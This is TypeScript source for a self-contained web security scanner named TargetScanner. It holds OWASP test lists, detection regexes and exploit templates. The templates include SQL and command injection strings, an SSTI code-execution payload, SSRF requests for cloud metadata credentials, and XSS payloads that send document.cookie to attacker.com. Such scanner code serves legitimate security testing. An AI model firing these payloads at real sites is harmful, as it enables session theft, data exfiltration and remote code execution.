/**
 * ╔═══════════════════════════════════════════════════════════════════════════════╗
 * ║                                                                             ║
 * ║          🎯  T A R G E T   S C A N N E R                                    ║
 * ║                                                                             ║
 * ║   Automated security assessment pipeline:                                   ║
 * ║     target → recon → scan → analyze → exploit → report                      ║
 * ║                                                                             ║
 * ║     • URL/target parsing and validation                                     ║
 * ║     • Passive reconnaissance (DNS, WHOIS, headers, tech fingerprint)        ║
 * ║     • Active vulnerability scanning (OWASP Top 10, CVE correlation)         ║
 * ║     • Exploit feasibility analysis and attack chain construction            ║
 * ║     • Attack surface mapping and risk scoring                               ║
 * ║     • Automated attack vector selection and prioritization                  ║
 * ║     • Comprehensive security assessment report generation                   ║
 * ║                                                                             ║
 * ║   No external dependencies. Fully self-contained.                           ║
 * ╚═══════════════════════════════════════════════════════════════════════════════╝
 */

// ── Helpers ──────────────────────────────────────────────────────

function round2(n: number): number { return Math.round(n * 100) / 100 }
function clamp(v: number, lo: number, hi: number): number { return Math.max(lo, Math.min(hi, v)) }

function generateId(prefix: string): string {
  return `${prefix}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`
}

function tokenize(text: string): string[] {
  return text.toLowerCase().split(/[\s\-_./,;:()[\]{}]+/).filter(Boolean)
}

// ── Types ────────────────────────────────────────────────────────────────────

export type ScanPhase =
  | 'pending'
  | 'recon'
  | 'scanning'
  | 'analysis'
  | 'exploitation'
  | 'reporting'
  | 'complete'
  | 'failed'

export type ScanDepth = 'quick' | 'standard' | 'deep' | 'full'
export type AttackUrgency = 'low' | 'medium' | 'high' | 'critical'

export interface TargetScannerConfig {
  scanDepth: ScanDepth;
  maxVulnerabilities: number;
  maxExploits: number;
  maxAttackChains: number;
  enablePassiveRecon: boolean;
  enableActiveScanning: boolean;
  enableExploitAnalysis: boolean;
  enableAttackSelection: boolean;
  enableReportGeneration: boolean;
  timeoutPerPhaseMs: number;
  riskThreshold: number;
  owaspTop10Enabled: boolean;
  cveCorrelationEnabled: boolean;
  followRedirects: boolean;
  maxRedirects: number;
  userAgent: string;
}

export interface TargetScannerStats {
  totalScans: number;
  totalTargetsScanned: number;
  totalVulnerabilitiesFound: number;
  totalExploitsIdentified: number;
  totalAttackChainsBuilt: number;
  totalReportsGenerated: number;
  avgRiskScore: number;
  avgScanDurationMs: number;
  criticalFindings: number;
  highFindings: number;
  mediumFindings: number;
  lowFindings: number;
  feedbackCount: number;
  avgFeedbackScore: number;
}

export interface TargetInfo {
  originalUrl: string;
  protocol: string;
  hostname: string;
  port: number;
  path: string;
  queryParams: Record<string, string>;
  isHttps: boolean;
  isIP: boolean;
  domain: string;
  tld: string;
  subdomain: string;
}

export interface ReconResult {
  target: TargetInfo;
  dnsRecords: DNSRecord[];
  whoisInfo: WhoisInfo;
  headers: HeaderAnalysis;
  technologies: TechFingerprint[];
  openPorts: PortInfo[];
  subdomains: string[];
  emails: string[];
  exposedPaths: string[];
  sslInfo: SSLInfo | null;
  robotsTxt: string[];
  sitemapUrls: string[];
}

export interface DNSRecord {
  type: 'A' | 'AAAA' | 'MX' | 'NS' | 'TXT' | 'CNAME' | 'SOA' | 'SRV';
  value: string;
  ttl: number;
}

export interface WhoisInfo {
  registrar: string;
  creationDate: string;
  expirationDate: string;
  nameServers: string[];
  dnssec: boolean;
  privacyProtected: boolean;
}

export interface HeaderAnalysis {
  server: string;
  poweredBy: string;
  securityHeaders: SecurityHeader[];
  missingHeaders: string[];
  cookies: CookieAnalysis[];
  cacheControl: string;
  contentType: string;
  cors: CORSAnalysis;
}

export interface SecurityHeader {
  name: string;
  value: string;
  present: boolean;
  secure: boolean;
  recommendation: string;
}

export interface CookieAnalysis {
  name: string;
  secure: boolean;
  httpOnly: boolean;
  sameSite: string;
  issues: string[];
}

export interface CORSAnalysis {
  allowOrigin: string;
  allowCredentials: boolean;
  allowMethods: string[];
  isPermissive: boolean;
  issues: string[];
}

export interface TechFingerprint {
  name: string;
  category: string;
  version: string;
  confidence: number;
  cves: string[];
}

export interface PortInfo {
  port: number;
  service: string;
  state: 'open' | 'filtered' | 'closed';
  version: string;
}

export interface SSLInfo {
  valid: boolean;
  issuer: string;
  subject: string;
  expiresAt: string;
  protocol: string;
  cipher: string;
  keySize: number;
  issues: string[];
}

export interface VulnerabilityFinding {
  id: string;
  title: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  category: string;
  owaspCategory: string;
  cweId: string;
  cveIds: string[];
  description: string;
  evidence: string;
  location: string;
  impact: string;
  remediation: string;
  cvssScore: number;
  exploitable: boolean;
  confidence: number;
}

export interface ExploitCandidate {
  id: string;
  vulnerabilityId: string;
  name: string;
  type: string;
  complexity: 'low' | 'medium' | 'high';
  reliability: number;
  prerequisites: string[];
  impact: string;
  steps: string[];
  payload: string;
  mitigation: string;
  estimatedSuccessRate: number;
}

export interface AttackChain {
  id: string;
  name: string;
  description: string;
  exploits: ExploitCandidate[];
  totalRisk: number;
  successProbability: number;
  impactScore: number;
  phases: AttackPhase[];
  mitigations: string[];
  difficulty: 'beginner' | 'intermediate' | 'advanced' | 'expert';
  estimatedTimeMinutes: number;
  requiresAuthentication: boolean;
}

export interface AttackPhase {
  order: number;
  name: string;
  description: string;
  exploitId: string;
  technique: string;
  mitreAttackId: string;
  expectedOutcome: string;
}

export interface AttackSurface {
  totalEndpoints: number;
  authenticationPoints: number;
  inputVectors: InputVector[];
  apiEndpoints: string[];
  fileUploadPoints: string[];
  adminPanels: string[];
  exposedServices: string[];
  thirdPartyIntegrations: string[];
  riskScore: number;
}

export interface InputVector {
  type: 'query_param' | 'form_field' | 'header' | 'cookie' | 'path' | 'json_body' | 'xml_body' | 'file_upload';
  location: string;
  parameter: string;
  testPayloads: string[];
  potentialVulns: string[];
}

export interface ScanReport {
  id: string;
  target: TargetInfo;
  scanDepth: ScanDepth;
  startedAt: number;
  completedAt: number;
  durationMs: number;
  phase: ScanPhase;
  recon: ReconResult;
  attackSurface: AttackSurface;
  vulnerabilities: VulnerabilityFinding[];
  exploits: ExploitCandidate[];
  attackChains: AttackChain[];
  riskScore: number;
  riskLevel: 'critical' | 'high' | 'medium' | 'low' | 'minimal';
  executiveSummary: string;
  recommendations: string[];
  technicalDetails: string;
}

export interface ScanProgress {
  phase: ScanPhase;
  percentComplete: number;
  currentActivity: string;
  findings: number;
  elapsed: number;
}

// ── Default Config ───────────────────────────────────────────────

export const DEFAULT_TARGET_SCANNER_CONFIG: TargetScannerConfig = {
  scanDepth: 'standard',
  maxVulnerabilities: 100,
  maxExploits: 50,
  maxAttackChains: 10,
  enablePassiveRecon: true,
  enableActiveScanning: true,
  enableExploitAnalysis: true,
  enableAttackSelection: true,
  enableReportGeneration: true,
  timeoutPerPhaseMs: 30000,
  riskThreshold: 3.0,
  owaspTop10Enabled: true,
  cveCorrelationEnabled: true,
  followRedirects: true,
  maxRedirects: 5,
  userAgent: 'TargetScanner/1.0 (Security Assessment)',
}

// ── Built-in Knowledge Databases ─────────────────────────────────

interface OWASPEntry {
  id: string;
  name: string;
  description: string;
  testCases: string[];
  payloads: string[];
  cweIds: string[];
}

interface CommonVulnPattern {
  id: string;
  name: string;
  category: string;
  owaspCategory: string;
  cweId: string;
  patterns: RegExp[];
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  description: string;
  remediation: string;
  payloads: string[];
}

interface HeaderRule {
  name: string;
  required: boolean;
  severity: 'high' | 'medium' | 'low';
  recommendation: string;
  validate: (value: string | undefined) => boolean;
}

interface TechSignature {
  name: string;
  category: string;
  patterns: { header?: string; body?: string; cookie?: string }[];
  cves: string[];
}

interface ExploitTemplate {
  vulnCategory: string;
  name: string;
  type: string;
  complexity: 'low' | 'medium' | 'high';
  steps: string[];
  payload: string;
  mitigation: string;
  successRate: number;
}

function buildOWASPTop10(): OWASPEntry[] {
  const db: OWASPEntry[] = []
  function add(id: string, name: string, description: string, testCases: string[], payloads: string[], cweIds: string[]): void {
    db.push({ id, name, description, testCases, payloads, cweIds })
  }

  add('A01:2021', 'Broken Access Control', 'Failures in enforcing access policies', [
    'Test IDOR on all endpoints', 'Try accessing admin paths without auth',
    'Modify JWT claims', 'Test horizontal privilege escalation',
    'Check for path traversal in file access', 'Test CORS misconfiguration',
  ], [
    '/../../../etc/passwd', '/admin', '/api/v1/users/other-user-id',
    '?role=admin', '?user_id=1', '/..;/admin',
  ], ['CWE-200', 'CWE-284', 'CWE-285', 'CWE-639', 'CWE-22'])

  add('A02:2021', 'Cryptographic Failures', 'Weak or missing encryption of sensitive data', [
    'Check for HTTP-only sensitive pages', 'Test for weak TLS versions',
    'Look for sensitive data in URLs', 'Check password storage methods',
    'Test for information disclosure in error messages',
  ], [
    'SSLv3 downgrade', 'TLS 1.0 negotiation', 'MD5/SHA1 hash reversal',
  ], ['CWE-259', 'CWE-327', 'CWE-328', 'CWE-330', 'CWE-261'])

  add('A03:2021', 'Injection', 'User-supplied data not validated or sanitized', [
    'SQL injection on all input fields', 'NoSQL injection tests',
    'OS command injection', 'LDAP injection', 'XPath injection',
    'Template injection (SSTI)', 'Header injection',
  ], [
    "' OR '1'='1", "'; DROP TABLE users;--", '${7*7}',
    '{{7*7}}', '| ls -la', '; cat /etc/passwd',
    '$(whoami)', '`id`', '%0d%0aInjected-Header: true',
  ], ['CWE-79', 'CWE-89', 'CWE-73', 'CWE-77', 'CWE-78', 'CWE-94'])

  add('A04:2021', 'Insecure Design', 'Missing or ineffective control design', [
    'Test business logic flaws', 'Check rate limiting on auth endpoints',
    'Test for missing anti-automation', 'Check password reset flow',
    'Test account enumeration via timing', 'Check for missing CAPTCHA',
  ], [
    'Rapid auth attempts', 'Predictable reset tokens', 'Missing CSRF tokens',
  ], ['CWE-209', 'CWE-256', 'CWE-501', 'CWE-522'])

  add('A05:2021', 'Security Misconfiguration', 'Missing hardening or improper configurations', [
    'Check default credentials', 'Check for unnecessary services',
    'Check error handling for info leaks', 'Check for debug mode',
    'Check for directory listing', 'Scan for exposed admin interfaces',
  ], [
    '/server-status', '/.env', '/phpinfo.php', '/debug',
    '/.git/HEAD', '/wp-admin', '/elmah.axd', '/trace.axd',
  ], ['CWE-16', 'CWE-611', 'CWE-1004'])

  add('A06:2021', 'Vulnerable and Outdated Components', 'Using components with known vulnerabilities', [
    'Check JavaScript library versions', 'Check server software versions',
    'Check for outdated CMS versions', 'Scan for known CVEs in detected tech',
  ], [
    'Version fingerprinting via headers', 'Script src version detection',
  ], ['CWE-1035', 'CWE-1104'])

  add('A07:2021', 'Identification and Authentication Failures', 'Broken authentication mechanisms', [
    'Test for credential stuffing', 'Test for brute force',
    'Check session management', 'Test for session fixation',
    'Check password policy', 'Test for insecure password recovery',
  ], [
    'admin:admin', 'admin:password', 'test:test',
    'Multiple rapid login attempts', 'Session token prediction',
  ], ['CWE-287', 'CWE-384', 'CWE-613'])

  add('A08:2021', 'Software and Data Integrity Failures', 'Code and infrastructure without integrity verification', [
    'Check for unsigned updates', 'Test for insecure deserialization',
    'Check CI/CD pipeline integrity', 'Test for CDN tampering risks',
  ], [
    'Serialized object manipulation', 'SRI check bypass',
  ], ['CWE-345', 'CWE-502', 'CWE-829'])

  add('A09:2021', 'Security Logging and Monitoring Failures', 'Insufficient logging of security events', [
    'Check for login attempt logging', 'Test for error logging',
    'Check for audit trail', 'Test for log injection',
  ], [
    'Log injection: %0d%0a[CRITICAL] Fake entry', 'Missing audit events',
  ], ['CWE-117', 'CWE-223', 'CWE-778'])

  add('A10:2021', 'Server-Side Request Forgery', 'Server fetches a URL without validating user input', [
    'Test URL parameters for SSRF', 'Test file import functions',
    'Test webhook URLs', 'Test PDF generators with URL input',
  ], [
    'http://127.0.0.1', 'http://169.254.169.254/latest/meta-data/',
    'http://[::1]', 'http://localhost:22', 'file:///etc/passwd',
    'dict://localhost:11211/stat',
  ], ['CWE-918'])

  return db
}

function buildVulnPatterns(): CommonVulnPattern[] {
  const db: CommonVulnPattern[] = []
  function add(id: string, name: string, cat: string, owasp: string, cwe: string,
    patterns: RegExp[], sev: 'critical' | 'high' | 'medium' | 'low' | 'info',
    desc: string, rem: string, payloads: string[]): void {
    db.push({ id, name, category: cat, owaspCategory: owasp, cweId: cwe, patterns, severity: sev, description: desc, remediation: rem, payloads })
  }

  add('VULN-001', 'SQL Injection', 'injection', 'A03:2021', 'CWE-89',
    [/['"]?\s*(OR|AND)\s+['"]?\d+['"]?\s*=\s*['"]?\d+/i, /UNION\s+SELECT/i, /;\s*(DROP|DELETE|INSERT|UPDATE)\s/i],
    'critical', 'Input not properly sanitized before SQL query', 'Use parameterized queries', ["' OR 1=1--", "' UNION SELECT null,null--"])

  add('VULN-002', 'Reflected XSS', 'xss', 'A03:2021', 'CWE-79',
    [/<script[^>]*>/i, /on(error|load|click|mouseover)\s*=/i, /javascript:/i],
    'high', 'User input reflected in page without escaping', 'Encode all output', ['<script>alert(1)</script>', '<img onerror=alert(1) src=x>'])

  add('VULN-003', 'Stored XSS', 'xss', 'A03:2021', 'CWE-79',
    [/<script[^>]*>[^<]*<\/script>/i, /<svg\s+onload/i],
    'critical', 'User input stored and rendered without escaping', 'Sanitize input, encode output', ['<svg onload=alert(1)>', '<img src=x onerror=fetch("https://attacker.com/"+document.cookie)>'])

  add('VULN-004', 'Command Injection', 'injection', 'A03:2021', 'CWE-78',
    [/[|;&`$]\s*(cat|ls|id|whoami|uname|curl|wget)/i, /\$\(.*\)/],
    'critical', 'User input passed to OS command without sanitization', 'Avoid shell commands, use allowlists', ['; id', '| cat /etc/passwd', '$(whoami)'])

  add('VULN-005', 'Path Traversal', 'file_access', 'A01:2021', 'CWE-22',
    [/\.\.\//g, /\.\.%2[fF]/g, /%2[eE]%2[eE]%2[fF]/g],
    'high', 'Path not properly restricted to intended directories', 'Use allowlists, canonicalize paths', ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini'])

  add('VULN-006', 'SSRF', 'ssrf', 'A10:2021', 'CWE-918',
    [/127\.0\.0\.1/, /localhost/i, /169\.254\.169\.254/, /\[::1\]/],
    'high', 'Server-side request to internal resources', 'Allowlist external domains, block private ranges', ['http://127.0.0.1', 'http://169.254.169.254/latest/meta-data/'])

  add('VULN-007', 'Insecure Direct Object Reference', 'access_control', 'A01:2021', 'CWE-639',
    [/\/api\/.*\/\d+/i, /\?(id|user_id|account|file)=/i],
    'high', 'Direct reference to internal objects without authorization', 'Implement access checks per request', ['?id=1', '?user_id=VICTIM_ID'])

  add('VULN-008', 'Open Redirect', 'redirect', 'A01:2021', 'CWE-601',
    [/[?&](redirect|url|next|return|goto|redir|destination)=/i],
    'medium', 'Unvalidated redirect URL controlled by user', 'Allowlist redirect domains', ['?redirect=https://attacker.com', '?url=//evil.com'])

  add('VULN-009', 'Information Disclosure', 'info_leak', 'A05:2021', 'CWE-200',
    [/stack\s*trace/i, /exception/i, /debug\s*mode/i, /phpinfo/i],
    'medium', 'Sensitive information exposed in responses', 'Disable debug mode, use generic error pages', ['/debug', '/.env', '/phpinfo.php'])

  add('VULN-010', 'CSRF', 'csrf', 'A01:2021', 'CWE-352',
    [/method\s*=\s*["']?post/i],
    'medium', 'State-changing requests without anti-forgery tokens', 'Implement CSRF tokens', ['<form method="POST" action="/transfer">'])

  add('VULN-011', 'XML External Entity', 'xxe', 'A05:2021', 'CWE-611',
    [/<!DOCTYPE[^>]*\[/i, /<!ENTITY/i, /SYSTEM\s+["']/i],
    'high', 'XML parser processes external entity references', 'Disable external entity processing', ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'])

  add('VULN-012', 'Insecure Deserialization', 'deserialization', 'A08:2021', 'CWE-502',
    [/ObjectInputStream/i, /pickle\.loads/i, /unserialize/i, /yaml\.load/i],
    'critical', 'Untrusted data deserialized without validation', 'Use safe deserialization, validate types', ['Serialized Java object', 'Pickle payload'])

  add('VULN-013', 'Broken Authentication', 'auth', 'A07:2021', 'CWE-287',
    [/basic\s+auth/i, /bearer\s+[a-zA-Z0-9._-]+/i],
    'high', 'Authentication mechanism can be bypassed', 'Implement MFA, rate limiting, secure session management', ['Basic YWRtaW46YWRtaW4='])

  add('VULN-014', 'Sensitive Data Exposure', 'data_exposure', 'A02:2021', 'CWE-312',
    [/password\s*[:=]\s*["'][^"']+["']/i, /api[_-]?key\s*[:=]\s*["'][^"']+["']/i, /secret\s*[:=]\s*["'][^"']+["']/i],
    'critical', 'Sensitive data exposed in code or responses', 'Encrypt sensitive data, use environment variables', ['password=admin123', 'api_key=sk_live_12345'])

  add('VULN-015', 'Server-Side Template Injection', 'ssti', 'A03:2021', 'CWE-94',
    [/\{\{.*\}\}/i, /\$\{.*\}/i, /<%.*%>/i],
    'critical', 'User input interpreted as template code', 'Sanitize input, use logic-less templates', ['{{7*7}}', '${7*7}', '<%= 7*7 %>'])

  return db
}

function buildHeaderRules(): HeaderRule[] {
  return [
    { name: 'Strict-Transport-Security', required: true, severity: 'high', recommendation: 'Add HSTS header with min 1 year max-age', validate: (v) => !!v && /max-age=\d{8,}/i.test(v) },
    { name: 'Content-Security-Policy', required: true, severity: 'high', recommendation: 'Implement restrictive CSP', validate: (v) => !!v && v.length > 10 },
    { name: 'X-Content-Type-Options', required: true, severity: 'medium', recommendation: 'Set X-Content-Type-Options: nosniff', validate: (v) => v === 'nosniff' },
    { name: 'X-Frame-Options', required: true, severity: 'medium', recommendation: 'Set X-Frame-Options: DENY or SAMEORIGIN', validate: (v) => !!v && /^(DENY|SAMEORIGIN)/i.test(v) },
    { name: 'X-XSS-Protection', required: false, severity: 'low', recommendation: 'Set X-XSS-Protection: 0 (rely on CSP instead)', validate: (v) => v === '0' || !v },
    { name: 'Referrer-Policy', required: true, severity: 'medium', recommendation: 'Set Referrer-Policy: strict-origin-when-cross-origin', validate: (v) => !!v && !/^unsafe-url$/i.test(v) },
    { name: 'Permissions-Policy', required: true, severity: 'medium', recommendation: 'Restrict browser features with Permissions-Policy', validate: (v) => !!v && v.length > 5 },
    { name: 'X-Permitted-Cross-Domain-Policies', required: false, severity: 'low', recommendation: 'Set to none if Flash/PDF embedding not needed', validate: (v) => !v || v === 'none' },
    { name: 'Cache-Control', required: true, severity: 'medium', recommendation: 'Set Cache-Control: no-store for sensitive pages', validate: (v) => !!v },
  ]
}

function buildTechSignatures(): TechSignature[] {
  return [
    { name: 'Apache', category: 'web_server', patterns: [{ header: 'apache' }], cves: ['CVE-2021-41773', 'CVE-2021-42013'] },
    { name: 'Nginx', category: 'web_server', patterns: [{ header: 'nginx' }], cves: ['CVE-2021-23017'] },
    { name: 'IIS', category: 'web_server', patterns: [{ header: 'microsoft-iis' }], cves: ['CVE-2021-31166'] },
    { name: 'Express.js', category: 'framework', patterns: [{ header: 'express' }, { cookie: 'connect.sid' }], cves: [] },
    { name: 'PHP', category: 'language', patterns: [{ header: 'php' }, { cookie: 'phpsessid' }], cves: ['CVE-2023-3824'] },
    { name: 'ASP.NET', category: 'framework', patterns: [{ header: 'asp.net' }, { cookie: 'asp.net_sessionid' }], cves: [] },
    { name: 'WordPress', category: 'cms', patterns: [{ body: 'wp-content' }, { body: 'wp-includes' }], cves: ['CVE-2023-2982'] },
    { name: 'Drupal', category: 'cms', patterns: [{ body: 'drupal' }, { header: 'x-drupal' }], cves: ['CVE-2018-7600'] },
    { name: 'Joomla', category: 'cms', patterns: [{ body: '/media/jui/' }, { cookie: 'joomla' }], cves: ['CVE-2023-23752'] },
    { name: 'React', category: 'frontend', patterns: [{ body: 'react' }, { body: '_reactroot' }], cves: [] },
    { name: 'Angular', category: 'frontend', patterns: [{ body: 'ng-version' }, { body: 'ng-app' }], cves: [] },
    { name: 'Vue.js', category: 'frontend', patterns: [{ body: 'vue' }, { body: '__vue__' }], cves: [] },
    { name: 'jQuery', category: 'library', patterns: [{ body: 'jquery' }], cves: ['CVE-2020-11022', 'CVE-2020-11023'] },
    { name: 'Django', category: 'framework', patterns: [{ cookie: 'csrftoken' }, { header: 'wsgiserver' }], cves: [] },
    { name: 'Ruby on Rails', category: 'framework', patterns: [{ header: 'x-powered-by: phusion passenger' }, { cookie: '_session_id' }], cves: [] },
    { name: 'Spring', category: 'framework', patterns: [{ header: 'x-application-context' }], cves: ['CVE-2022-22965'] },
    { name: 'Tomcat', category: 'web_server', patterns: [{ header: 'tomcat' }, { body: 'apache tomcat' }], cves: ['CVE-2022-42252'] },
    { name: 'CloudFlare', category: 'cdn', patterns: [{ header: 'cloudflare' }, { header: 'cf-ray' }], cves: [] },
    { name: 'AWS', category: 'cloud', patterns: [{ header: 'amazons3' }, { header: 'x-amz' }], cves: [] },
    { name: 'Firebase', category: 'backend', patterns: [{ body: 'firebaseapp.com' }], cves: [] },
  ]
}

function buildExploitTemplates(): ExploitTemplate[] {
  return [
    { vulnCategory: 'injection', name: 'SQL Injection - Authentication Bypass', type: 'sqli_auth_bypass', complexity: 'low', steps: ['Identify login form', 'Test for SQL injection in username/password fields', 'Craft authentication bypass payload', 'Verify access to authenticated area'], payload: "admin' OR '1'='1'--", mitigation: 'Use parameterized queries', successRate: 0.7 },
    { vulnCategory: 'injection', name: 'SQL Injection - Data Exfiltration', type: 'sqli_data_exfil', complexity: 'medium', steps: ['Identify injectable parameter', 'Determine database type', 'Enumerate tables and columns', 'Extract data using UNION SELECT'], payload: "' UNION SELECT username,password FROM users--", mitigation: 'Parameterized queries, WAF rules', successRate: 0.6 },
    { vulnCategory: 'xss', name: 'Reflected XSS - Cookie Theft', type: 'xss_cookie_theft', complexity: 'low', steps: ['Find reflected input parameter', 'Test for XSS filter bypass', 'Craft payload to exfiltrate cookies', 'Set up receiver endpoint'], payload: '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>', mitigation: 'Input validation, output encoding, CSP', successRate: 0.65 },
    { vulnCategory: 'xss', name: 'Stored XSS - Account Takeover', type: 'xss_account_takeover', complexity: 'medium', steps: ['Find stored input (comments, profile)', 'Inject XSS payload that persists', 'Craft session hijacking script', 'Wait for victim to trigger'], payload: '<svg onload="new Image().src=\'https://attacker.com/\'+document.cookie">', mitigation: 'HTML sanitization, CSP, HttpOnly cookies', successRate: 0.55 },
    { vulnCategory: 'file_access', name: 'Path Traversal - Source Code Leak', type: 'path_traversal_source', complexity: 'low', steps: ['Identify file parameter', 'Test path traversal sequences', 'Navigate to sensitive files', 'Extract configuration/source'], payload: '../../../../etc/passwd', mitigation: 'Canonicalize paths, use allowlist', successRate: 0.5 },
    { vulnCategory: 'ssrf', name: 'SSRF - Cloud Metadata Extraction', type: 'ssrf_metadata', complexity: 'medium', steps: ['Identify URL/fetch parameter', 'Test internal IP access', 'Request cloud metadata endpoint', 'Extract credentials/tokens'], payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', mitigation: 'Allowlist external URLs, block private ranges', successRate: 0.55 },
    { vulnCategory: 'access_control', name: 'IDOR - Unauthorized Data Access', type: 'idor_data_access', complexity: 'low', steps: ['Identify object reference in URL/body', 'Create two test accounts', 'Use Account A to access Account B data', 'Verify no authorization check'], payload: 'GET /api/users/VICTIM_ID/profile', mitigation: 'Implement object-level authorization', successRate: 0.75 },
    { vulnCategory: 'auth', name: 'Brute Force - Credential Stuffing', type: 'brute_force_creds', complexity: 'low', steps: ['Identify login endpoint', 'Check for rate limiting', 'Test common credential pairs', 'Monitor for successful authentication'], payload: 'POST /login with common username:password pairs', mitigation: 'Rate limiting, account lockout, MFA', successRate: 0.3 },
    { vulnCategory: 'deserialization', name: 'Insecure Deserialization - RCE', type: 'deser_rce', complexity: 'high', steps: ['Identify serialized data input', 'Determine serialization format', 'Craft malicious serialized payload', 'Achieve remote code execution'], payload: 'Crafted serialized object with command execution', mitigation: 'Avoid deserializing untrusted data', successRate: 0.35 },
    { vulnCategory: 'ssti', name: 'SSTI - Remote Code Execution', type: 'ssti_rce', complexity: 'medium', steps: ['Identify template rendering point', 'Test for template engine detection', 'Craft engine-specific RCE payload', 'Execute system commands'], payload: '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}', mitigation: 'Sandbox templates, sanitize input', successRate: 0.45 },
    { vulnCategory: 'redirect', name: 'Open Redirect - Phishing', type: 'open_redirect_phish', complexity: 'low', steps: ['Identify redirect parameter', 'Test for external URL acceptance', 'Craft phishing page mimicking target', 'Distribute malicious link'], payload: '?redirect=https://attacker-phishing-site.com', mitigation: 'Allowlist redirect destinations', successRate: 0.8 },
    { vulnCategory: 'csrf', name: 'CSRF - State Change Attack', type: 'csrf_state_change', complexity: 'low', steps: ['Identify state-changing endpoint', 'Verify no CSRF token', 'Create attack page with auto-submit form', 'Trick victim to visit attack page'], payload: '<form action="/change-email" method="POST"><input name="email" value="attacker@evil.com"><script>document.forms[0].submit()</script></form>', mitigation: 'Implement CSRF tokens, SameSite cookies', successRate: 0.7 },
  ]
}

function buildCommonPorts(): { port: number; service: string }[] {
  return [
    { port: 21, service: 'FTP' }, { port: 22, service: 'SSH' },
    { port: 23, service: 'Telnet' }, { port: 25, service: 'SMTP' },
    { port: 53, service: 'DNS' }, { port: 80, service: 'HTTP' },
    { port: 110, service: 'POP3' }, { port: 143, service: 'IMAP' },
    { port: 443, service: 'HTTPS' }, { port: 445, service: 'SMB' },
    { port: 993, service: 'IMAPS' }, { port: 995, service: 'POP3S' },
    { port: 1433, service: 'MSSQL' }, { port: 1521, service: 'Oracle' },
    { port: 3306, service: 'MySQL' }, { port: 3389, service: 'RDP' },
    { port: 5432, service: 'PostgreSQL' }, { port: 5900, service: 'VNC' },
    { port: 6379, service: 'Redis' }, { port: 8080, service: 'HTTP-Proxy' },
    { port: 8443, service: 'HTTPS-Alt' }, { port: 8888, service: 'HTTP-Alt' },
    { port: 9090, service: 'WebUI' }, { port: 9200, service: 'Elasticsearch' },
    { port: 27017, service: 'MongoDB' },
  ]
}

function buildExposedPaths(): string[] {
  return [
    '/.env', '/.git/HEAD', '/.git/config', '/.htaccess', '/.htpasswd',
    '/wp-admin/', '/wp-login.php', '/wp-config.php.bak',
    '/admin', '/admin/', '/administrator/', '/login', '/dashboard',
    '/phpmyadmin/', '/phpinfo.php', '/info.php',
    '/server-status', '/server-info', '/status',
    '/api/', '/api/v1/', '/api/docs', '/swagger.json', '/swagger-ui/',
    '/graphql', '/graphiql',
    '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
    '/.well-known/security.txt', '/security.txt',
    '/backup/', '/backup.zip', '/backup.sql', '/db.sql',
    '/debug', '/debug/', '/trace', '/actuator', '/actuator/health',
    '/elmah.axd', '/web.config', '/config.json', '/config.yml',
    '/cgi-bin/', '/test/', '/temp/', '/tmp/',
    '/.DS_Store', '/thumbs.db',
    '/console', '/shell', '/cmd',
  ]
}

// ── Main Class ───────────────────────────────────────────────────

export class TargetScanner {
  private readonly config: TargetScannerConfig
  private readonly stats: TargetScannerStats
  private readonly owaspTop10: OWASPEntry[]
  private readonly vulnPatterns: CommonVulnPattern[]
  private readonly headerRules: HeaderRule[]
  private readonly techSignatures: TechSignature[]
  private readonly exploitTemplates: ExploitTemplate[]
  private readonly commonPorts: { port: number; service: string }[]
  private readonly exposedPaths: string[]

  constructor(config: Partial<TargetScannerConfig> = {}) {
    this.config = { ...DEFAULT_TARGET_SCANNER_CONFIG, ...config }
    this.stats = {
      totalScans: 0,
      totalTargetsScanned: 0,
      totalVulnerabilitiesFound: 0,
      totalExploitsIdentified: 0,
      totalAttackChainsBuilt: 0,
      totalReportsGenerated: 0,
      avgRiskScore: 0,
      avgScanDurationMs: 0,
      criticalFindings: 0,
      highFindings: 0,
      mediumFindings: 0,
      lowFindings: 0,
      feedbackCount: 0,
      avgFeedbackScore: 0,
    }
    this.owaspTop10 = buildOWASPTop10()
    this.vulnPatterns = buildVulnPatterns()
    this.headerRules = buildHeaderRules()
    this.techSignatures = buildTechSignatures()
    this.exploitTemplates = buildExploitTemplates()
    this.commonPorts = buildCommonPorts()
    this.exposedPaths = buildExposedPaths()
  }

  // ── URL Parsing ──────────────────────────────────────────────

  parseTarget(url: string): TargetInfo {
    const trimmed = url.trim()
    const withProto = /^https?:\/\//i.test(trimmed) ? trimmed : `https://${trimmed}`

    let protocol = 'https'
    let hostname = ''
    let port = 443
    let path = '/'
    const queryParams: Record<string, string> = {}

    const protoMatch = withProto.match(/^(https?):\/\//i)
    if (protoMatch) protocol = protoMatch[1].toLowerCase()

    const afterProto = withProto.replace(/^https?:\/\//i, '')
    const pathOrQueryIdx = afterProto.search(/[/?]/)
    const hostPart = pathOrQueryIdx >= 0 ? afterProto.slice(0, pathOrQueryIdx) : afterProto
    const pathPart = pathOrQueryIdx >= 0 ? afterProto.slice(pathOrQueryIdx) : '/'

    const portMatch = hostPart.match(/:(\d+)$/)
    if (portMatch) {
      hostname = hostPart.slice(0, hostPart.lastIndexOf(':'))
      port = parseInt(portMatch[1], 10)
    } else {
      hostname = hostPart
      port = protocol === 'https' ? 443 : 80
    }

    const queryIdx = pathPart.indexOf('?')
    if (queryIdx >= 0) {
      path = pathPart.slice(0, queryIdx)
      const qs = pathPart.slice(queryIdx + 1)
      for (const pair of qs.split('&')) {
        const [k, v] = pair.split('=')
        if (k) queryParams[decodeURIComponent(k)] = v ? decodeURIComponent(v) : ''
      }
    } else {
      path = pathPart
    }

    const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(hostname) || /^\[.*\]$/.test(hostname)

    let domain = hostname
    let tld = ''
    let subdomain = ''
    if (!isIP) {
      const parts = hostname.split('.')
      if (parts.length >= 2) {
        tld = parts[parts.length - 1]
        domain = parts.slice(-2).join('.')
        subdomain = parts.length > 2 ? parts.slice(0, -2).join('.') : ''
      }
    }

    return {
      originalUrl: trimmed,
      protocol,
      hostname,
      port,
      path,
      queryParams,
      isHttps: protocol === 'https',
      isIP,
      domain,
      tld,
      subdomain,
    }
  }

